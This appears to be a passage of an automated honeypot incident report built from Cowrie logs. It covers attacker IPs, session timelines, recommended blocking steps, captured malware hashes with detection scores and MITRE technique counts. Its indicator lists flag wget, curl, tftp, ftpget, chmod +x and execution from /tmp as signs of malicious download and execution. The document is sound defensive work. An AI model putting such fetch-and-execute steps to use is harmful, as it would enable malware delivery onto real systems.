| `2026-07-30 04:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.184[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.53.184[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed08dc32ed6

| Field | Detail |
|---|---|
| **Source IP** | `34.53.184[.]34` |
| **First Seen** | 2026-07-30 04:22 |
| **Last Seen** | 2026-07-30 04:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:22:34` | `cowrie.session.connect` |
| `2026-07-30 04:22:34` | `cowrie.login.success` |
| `2026-07-30 04:22:34` | `cowrie.session.params` |
| `2026-07-30 04:22:34` | `cowrie.command.input` |
| `2026-07-30 04:22:39` | `cowrie.log.closed` |
| `2026-07-30 04:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.184[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.53.184[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0424868d21c3

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-07-30 04:25 |
| **Last Seen** | 2026-07-30 04:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:25:52` | `cowrie.session.connect` |
| `2026-07-30 04:25:53` | `cowrie.client.version` |
| `2026-07-30 04:25:53` | `cowrie.client.kex` |
| `2026-07-30 04:25:55` | `cowrie.login.success` |
| `2026-07-30 04:25:56` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15eae75ab3be

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]2` |
| **First Seen** | 2026-07-30 04:33 |
| **Last Seen** | 2026-07-30 04:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:33:39` | `cowrie.session.connect` |
| `2026-07-30 04:33:40` | `cowrie.client.version` |
| `2026-07-30 04:33:40` | `cowrie.client.kex` |
| `2026-07-30 04:33:43` | `cowrie.login.success` |
| `2026-07-30 04:33:43` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8f8dbc3b50

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-30 04:33 |
| **Last Seen** | 2026-07-30 04:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:33:48` | `cowrie.session.connect` |
| `2026-07-30 04:33:49` | `cowrie.client.version` |
| `2026-07-30 04:33:49` | `cowrie.client.kex` |
| `2026-07-30 04:33:50` | `cowrie.login.success` |
| `2026-07-30 04:33:51` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65f2240733d

| Field | Detail |
|---|---|
| **Source IP** | `14.29.248[.]43` |
| **First Seen** | 2026-07-30 04:42 |
| **Last Seen** | 2026-07-30 04:43 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:42:59` | `cowrie.session.connect` |
| `2026-07-30 04:42:59` | `cowrie.client.version` |
| `2026-07-30 04:42:59` | `cowrie.client.kex` |
| `2026-07-30 04:43:10` | `cowrie.login.success` |
| `2026-07-30 04:43:14` | `cowrie.session.params` |
| `2026-07-30 04:43:14` | `cowrie.command.input` |
| `2026-07-30 04:43:16` | `cowrie.log.closed` |
| `2026-07-30 04:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.248[.]43` to AbuseIPDB if not already reported
- [ ] Block `14.29.248[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d0ad3512b60

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-07-30 04:44 |
| **Last Seen** | 2026-07-30 04:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:44:47` | `cowrie.session.connect` |
| `2026-07-30 04:44:49` | `cowrie.client.version` |
| `2026-07-30 04:44:49` | `cowrie.client.kex` |
| `2026-07-30 04:44:52` | `cowrie.login.success` |
| `2026-07-30 04:44:52` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9b4f329b92

| Field | Detail |
|---|---|
| **Source IP** | `124.133.10[.]66` |
| **First Seen** | 2026-07-30 04:52 |
| **Last Seen** | 2026-07-30 04:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:52:31` | `cowrie.session.connect` |
| `2026-07-30 04:52:32` | `cowrie.client.version` |
| `2026-07-30 04:52:32` | `cowrie.client.kex` |
| `2026-07-30 04:52:35` | `cowrie.login.success` |
| `2026-07-30 04:52:36` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.133.10[.]66` to AbuseIPDB if not already reported
- [ ] Block `124.133.10[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6784289888c8

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-07-30 04:52 |
| **Last Seen** | 2026-07-30 04:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:52:42` | `cowrie.session.connect` |
| `2026-07-30 04:52:42` | `cowrie.client.version` |
| `2026-07-30 04:52:42` | `cowrie.client.kex` |
| `2026-07-30 04:52:44` | `cowrie.login.success` |
| `2026-07-30 04:52:45` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:52:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **80** | 2026-07-30 00:55 | 2026-07-30 04:48 | 64m | 0 | `T1592` | 🟠 MEDIUM |
| `34.38.215[.]120` | **30** | 2026-07-30 03:42 | 2026-07-30 03:43 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.53.184[.]34` | **30** | 2026-07-30 04:21 | 2026-07-30 04:22 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `8.217.232[.]214` | **19** | 2026-07-30 03:08 | 2026-07-30 03:22 | 14m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-07-30 01:00 | 2026-07-30 04:48 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]217` | **5** | 2026-07-30 01:54 | 2026-07-30 01:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **4** | 2026-07-30 01:31 | 2026-07-30 04:38 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-07-30 01:11 | 2026-07-30 01:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-30 04:14 | 2026-07-30 04:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-30 03:32 | 2026-07-30 03:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]104` | **3** | 2026-07-30 01:53 | 2026-07-30 01:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]168` | **3** | 2026-07-30 01:53 | 2026-07-30 01:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-30 02:13 | 2026-07-30 02:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-30 02:35 | 2026-07-30 02:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]118` | **2** | 2026-07-30 01:08 | 2026-07-30 01:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-07-30 01:07 | 2026-07-30 01:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.64.106[.]116` | **2** | 2026-07-30 04:31 | 2026-07-30 04:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `110.78.165[.]192` | 1 | 2026-07-30 02:40 | 2026-07-30 02:41 | 8s | 0 | `T1592` | 🟢 LOW |
| `125.20.207[.]154` | 1 | 2026-07-30 03:23 | 2026-07-30 03:23 | 8s | 0 | `T1592` | 🟢 LOW |
| `14.29.248[.]43` | 1 | 2026-07-30 04:42 | 2026-07-30 04:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `155.4.209[.]51` | 1 | 2026-07-30 03:44 | 2026-07-30 03:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-30 04:28 | 2026-07-30 04:29 | 33s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-07-30 01:28 | 2026-07-30 01:28 | 6s | 0 | `T1592` | 🟢 LOW |
| `180.184.161[.]95` | 1 | 2026-07-30 01:49 | 2026-07-30 01:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-07-30 03:17 | 2026-07-30 03:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-07-30 00:57 | 2026-07-30 00:59 | 90s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | 1 | 2026-07-30 01:16 | 2026-07-30 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.225[.]67` | 1 | 2026-07-30 04:27 | 2026-07-30 04:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `219.144.16[.]16` | 1 | 2026-07-30 04:44 | 2026-07-30 04:44 | 7s | 0 | `T1592` | 🟢 LOW |
| `220.205.123[.]19` | 1 | 2026-07-30 03:51 | 2026-07-30 03:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.79.68[.]242` | 1 | 2026-07-30 02:20 | 2026-07-30 02:20 | 9s | 0 | `T1592` | 🟢 LOW |
| `35.195.25[.]42` | 1 | 2026-07-30 02:20 | 2026-07-30 02:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-30 03:51 | 2026-07-30 03:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-30 01:43 | 2026-07-30 01:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-07-30 02:55 | 2026-07-30 02:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.182[.]31` | 1 | 2026-07-30 02:51 | 2026-07-30 02:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `54.166.249[.]45` | 1 | 2026-07-30 01:22 | 2026-07-30 01:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]141` | 1 | 2026-07-30 03:15 | 2026-07-30 03:16 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-07-30 01:27 | 2026-07-30 01:27 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-07-30 03:56 | 2026-07-30 03:56 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]172` | 1 | 2026-07-30 01:55 | 2026-07-30 01:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]166` | 1 | 2026-07-30 03:46 | 2026-07-30 03:46 | 17s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-07-30 03:13 | 2026-07-30 03:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]10` | 1 | 2026-07-30 02:05 | 2026-07-30 02:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]35` | 1 | 2026-07-30 02:19 | 2026-07-30 02:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.247.175[.]159` | 1 | 2026-07-30 01:42 | 2026-07-30 01:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | 1 | 2026-07-30 01:12 | 2026-07-30 01:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]92` | 1 | 2026-07-30 01:26 | 2026-07-30 01:26 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.152[.]30` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 30 |
| `123.52.202[.]92` | CN | CHINANET HENAN PROVINCE NETWORK | **100** ⚠️ | 50 |
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 8 |
| `221.120.57[.]125` | TW | CHT-Mobile Business Group,Chunghwa | **100** ⚠️ | 50 |
| `122.160.15[.]31` | IN | ABTS DELHI, | **100** ⚠️ | 50 |
| `14.99.61[.]248` | IN | TATATELESERVICES-Delhi | **100** ⚠️ | 50 |
| `114.30.223[.]119` | KR | HVHonam | **100** ⚠️ | 50 |
| `34.53.184[.]34` | BE | Google LLC | **100** ⚠️ | 1 |
| `172.90.128[.]97` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `111.70.23[.]248` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 254 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 221 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 68 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 67 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 65 |

---

## 🔕 False Positive Summary (67 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
